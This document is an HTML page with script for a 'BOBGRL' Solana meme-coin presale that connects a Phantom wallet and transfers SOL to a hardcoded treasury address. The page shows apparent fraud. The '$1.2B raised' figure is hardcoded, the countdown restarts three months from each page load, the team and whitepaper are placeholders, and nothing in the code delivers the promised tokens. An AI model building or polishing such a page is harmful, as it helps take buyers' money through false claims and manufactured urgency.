<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BOBGRL Presale</title>
<style>
  /* --- Global --- */
  * { box-sizing:border-box; margin:0; padding:0; }
  body { font-family:'Segoe UI',sans-serif; background:#0b0c17; color:#e0e0e0; overflow-x:hidden; line-height:1.6; }
  a { color:#ffa500; text-decoration:none; } a:hover {text-decoration:underline;}
  header { padding:1rem 2rem; background:rgba(15,17,31,0.95); display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; z-index:1000;}
  header h1 {color:#ffa500;}
  nav a {margin-left:1rem; font-weight:bold;}
  main {max-width:1200px; margin:auto; padding:2rem; position:relative; z-index:2;}
  section {margin-bottom:4rem;}
  h2 {color:#ffa500; margin-bottom:1rem;}
  p {margin-bottom:1rem;}
  button {background:#ffa500;color:#0b0c17;border:none;padding:0.6rem 1.2rem;font-size:1rem;border-radius:5px;cursor:pointer; transition:0.3s;}
  button:hover {background:#e69500;}
  input[type=number] {padding:0.5rem; width:120px; border-radius:5px; border:none; margin-left:0.5rem;}
  .progress-container {background:#1b1c2b;border-radius:10px;overflow:hidden;height:25px;margin-top:1rem;}
  .progress-bar {background:#ffa500;height:100%;width:25%; text-align:right;padding-right:5px;box-sizing:border-box;color:#0b0c17;font-weight:bold;}
  .timer { font-size:1.2rem; margin-top:0.5rem;}
  .faq-item { margin-bottom:1rem; }
  .faq-question { cursor:pointer;padding:0.5rem;background:#1b1c2b;border-radius:5px;}
  .faq-answer { display:none; padding:0.5rem 1rem; background:#131424; border-radius:5px; margin-top:0.3rem;}
  .roadmap { background:#131424; padding:1rem; border-radius:10px; }
  .tokenomics { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:1rem; }
  .token-card { background:#1b1c2b; padding:1rem; border-radius:10px; text-align:center; }
  .team { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:1rem; }
  .team-member { background:#1b1c2b; padding:1rem; border-radius:10px; text-align:center; }
  .whitepaper iframe { width:100%; height:600px; border:none; border-radius:10px; }
  /* --- Background animation --- */
  #stars { position:fixed; top:0; left:0; width:100%; height:100%; background:#0b0c17; z-index:0; overflow:hidden; }
  .star { position:absolute; width:2px; height:2px; background:white; border-radius:50%; opacity:0.6; animation:twinkle 5s infinite alternate; }
  @keyframes twinkle { from {opacity:0.2;} to {opacity:0.6;} }
</style>
</head>
<body>

<div id="stars"></div>

<header>
  <h1>BOBGRL</h1>
  <nav>
    <a href="#presale">Presale</a>
    <a href="#tokenomics">Tokenomics</a>
    <a href="#roadmap">Roadmap</a>
    <a href="#whitepaper">Whitepaper</a>
    <a href="#faq">FAQ</a>
    <a href="#team">Team</a>
  </nav>
</header>

<main>
<!-- --- Presale --- -->
<section id="presale">
  <h2>Presale</h2>
  <p>Connect your Phantom wallet to participate in the BOBGRL presale!</p>
  <button id="connect-btn">Connect Phantom Wallet</button>
  <p id="wallet-address"></p>

  <div style="margin-top:1rem;">
    <label>Purchase amount (USD, min $10): </label>
    <input type="number" id="usd-amount" value="10" min="10" step="1"/>
    <button id="buy-btn">Buy BOBGRL</button>
  </div>

  <div class="progress-container">
    <div id="progress-bar" class="progress-bar" data-current="1209342990">$1.21B</div>
  </div>
  <p id="progress-text">Raised $1,209,342,990 of $4,000,000,000</p>
  <p class="timer" id="countdown"></p>
</section>

<!-- --- Tokenomics --- -->
<section id="tokenomics">
  <h2>Tokenomics</h2>
  <div class="tokenomics">
    <div class="token-card">
      <h3>Total Supply</h3>
      <p>4,000,000,000 BOBGRL</p>
    </div>
    <div class="token-card">
      <h3>Burn on Sell</h3>
      <p>50%</p>
    </div>
    <div class="token-card">
      <h3>Liquidity Tax</h3>
      <p>2%</p>
    </div>
    <div class="token-card">
      <h3>Max Wallet</h3>
      <p>2% of supply</p>
    </div>
    <div class="token-card">
      <h3>Presale Price</h3>
      <p>$0.01 / BOBGRL</p>
    </div>
    <div class="token-card">
      <h3>Deflationary</h3>
      <p>Yes, tokens decrease on sales</p>
    </div>
  </div>
</section>

<!-- --- Roadmap --- -->
<section id="roadmap">
  <h2>Roadmap</h2>
  <div class="roadmap">
    <ul>
      <li>April: Presale launched - $1.2B collected</li>
      <li>Next 3 months: Continue presale to $4B</li>
      <li>Token launch & exchange listing</li>
      <li>Community events & NFT collaborations</li>
      <li>Marketing campaigns & partnerships</li>
    </ul>
  </div>
</section>

<!-- --- Whitepaper --- -->
<section id="whitepaper">
  <h2>Whitepaper</h2>
  <p>Read the full whitepaper below:</p>
  <iframe src="https://example.com/whitepaper.pdf"></iframe>
</section>

<!-- --- FAQ --- -->
<section id="faq">
  <h2>FAQ</h2>
  <div class="faq-item">
    <div class="faq-question">What is BOBGRL?</div>
    <div class="faq-answer">BOBGRL is a deflationary meme coin designed to reward holders while burning tokens on sales.</div>
  </div>
  <div class="faq-item">
    <div class="faq-question">How do I participate in the presale?</div>
    <div class="faq-answer">Connect your Phantom wallet, enter an amount â‰¥ $10, and click Buy. Tokens are credited after a successful transaction.</div>
  </div>
  <div class="faq-item">
    <div class="faq-question">What wallets are supported?</div>
    <div class="faq-answer">Currently Phantom Wallet is fully supported. Other Solana wallets may work but are not guaranteed.</div>
  </div>
  <div class="faq-item">
    <div class="faq-question">Can I purchase from any country?</div>
    <div class="faq-answer">Yes, unless restricted by local regulations. Always check your jurisdiction before participating.</div>
  </div>
  <div class="faq-item">
    <div class="faq-question">What happens if the presale goal is exceeded?</div>
    <div class="faq-answer">All contributions are accepted. Tokens will be minted proportionally and liquidity adjusted accordingly.</div>
  </div>
</section>

<!-- --- Team --- -->
<section id="team">
  <h2>Team</h2>
  <div class="team">
    <div class="team-member">
      <h3>Charles Copeland</h3>
      <p>Founder & Developer</p>
    </div>
    <div class="team-member">
      <h3>Jane Doe</h3>
      <p>Marketing Lead</p>
    </div>
  </div>
</section>
</main>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
<script>
let provider = null;
const TREASURY = "ERGRYbUdR2ARJ5LapoztQzHt5qQPtfxuKsT23q3U7Aju";
const USD_TO_SOL = 0.02;

// Generate animated stars
const starCount=100;
const starsContainer=document.getElementById("stars");
for(let i=0;i<starCount;i++){
  const star=document.createElement("div");
  star.classList.add("star");
  star.style.top=Math.random()*100+"%";
  star.style.left=Math.random()*100+"%";
  star.style.width=star.style.height=(Math.random()*2+1)+"px";
  star.style.animationDuration=(Math.random()*5+3)+"s";
  starsContainer.appendChild(star);
}

// Phantom wallet detection
const getProvider=()=>{ if("solana" in window){ const p=window.solana; if(p.isPhantom) return p; } alert("Phantom Wallet not found!"); };
provider=getProvider();

// Connect wallet
const connectWallet=async()=>{
  if(!provider) return;
  try{
    const resp=await provider.connect();
    document.getElementById("wallet-address").textContent="Connected: "+resp.publicKey.toString();
  } catch(e){ alert("Connection failed: "+e.message);}
};

// Buy tokens
const buyTokens=async()=>{
  if(!provider||!provider.isConnected) return alert("Connect your wallet first.");
  const usd=parseFloat(document.getElementById("usd-amount").value);
  if(usd<10) return alert("Minimum $10");

  const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
  const fromPubkey = provider.publicKey;

  // Check SOL balance first
  const balance = await connection.getBalance(fromPubkey);
  const solAmount = usd * USD_TO_SOL;
  const lamportsToSend = solAmount * solanaWeb3.LAMPORTS_PER_SOL;

  if(balance < lamportsToSend){
    return alert(`Insufficient SOL balance. You have ${(balance/solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL, need ${solAmount.toFixed(4)} SOL`);
  }

  try{
    const toPubkey = new solanaWeb3.PublicKey(TREASURY);
    const { blockhash } = await connection.getRecentBlockhash();
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey,
        toPubkey,
        lamports: lamportsToSend
      })
    );
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    const signed = await provider.signTransaction(transaction);
    const txid = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(txid);

    alert(`Purchase successful! TXID: ${txid}`);
  } catch(e){
    console.error(e);
    alert("Transaction failed: "+e.message);
  }
};

// Countdown timer
const endTime = new Date();
endTime.setMonth(endTime.getMonth()+3);
const countdownEl = document.getElementById("countdown");
const updateCountdown = ()=>{
  const now = new Date();
  let diff = endTime - now;
  if(diff<0) diff=0;
  const d = Math.floor(diff/(1000*60*60*24));
  const h = Math.floor((diff/(1000*60*60))%24);
  const m = Math.floor((diff/(1000*60))%60);
  const s = Math.floor((diff/1000)%60);
  countdownEl.textContent = `Presale ends in: ${d}d ${h}h ${m}m ${s}s`;
};
setInterval(updateCountdown,1000); updateCountdown();

// FAQ toggle
document.querySelectorAll(".faq-question").forEach(q=>{
  q.addEventListener("click",()=>{
    const ans=q.nextElementSibling;
    ans.style.display=(ans.style.display==="block"?"none":"block");
  });
});

// Event listeners
window.addEventListener("DOMContentLoaded",()=>{
  document.getElementById("connect-btn").addEventListener("click",connectWallet);
  document.getElementById("buy-btn").addEventListener("click",buyTokens);
});
</script>
</body>
</html>
